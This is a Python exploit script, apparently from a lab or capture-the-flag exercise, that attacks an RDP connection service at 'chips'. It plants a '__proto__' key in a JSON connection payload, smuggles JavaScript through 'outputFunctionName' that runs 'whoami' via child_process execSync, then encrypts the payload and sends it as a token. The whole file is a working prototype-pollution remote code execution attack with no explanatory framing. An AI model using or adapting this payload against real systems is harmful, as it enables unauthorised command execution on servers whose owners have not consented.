import requests
import sys
import json
from token_enc import encrypt

payload = {
  "connection": {
    "type": "rdp",
    "settings": {
      "hostname": "rdesktop",
      "username": "abc",
      "password": "abc",
      "port": "3389",
      "security": "any",
      "ignore-cert": "true",
      "client-name": "",
      "console": "false",
      "initial-program": ""
    }
  }
}

def request_rdp(ip, token):
  target = f"http://chips/rdp?token={token}"
  print("Target")
  print(target)
  print()
  requests.get(target)

def main():
  if len(sys.argv) != 2:
    print ("(+) usage: %s <target>" % sys.argv[0])
    print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
    sys.exit(-1)

  ip = sys.argv[1]

  payload["connection"]["settings"]["__proto__"] = {
    "outputFunctionName": "x = 1; console.log(process.mainModule.require('child_process').execSync('whoami').toString()); var y"
  }

  print(json.dumps(payload))
  print()

  token = encrypt(payload)

  request_rdp(ip, token)

if __name__ == '__main__':
  main()